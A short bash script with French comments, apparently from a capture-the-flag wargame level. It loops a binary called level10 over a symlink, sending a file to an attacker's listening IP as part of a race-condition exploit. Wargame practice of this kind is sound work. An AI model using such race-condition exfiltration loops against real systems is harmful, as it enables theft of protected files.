#!/bin/bash

LIENSYM="/tmp/lien"
ADRESSE_IP="192.168.122.1"  # Mettez ici l'adresse IP de votre machine d'écoute

while true; do
    ./level10 $LIENSYM $ADRESSE_IP
done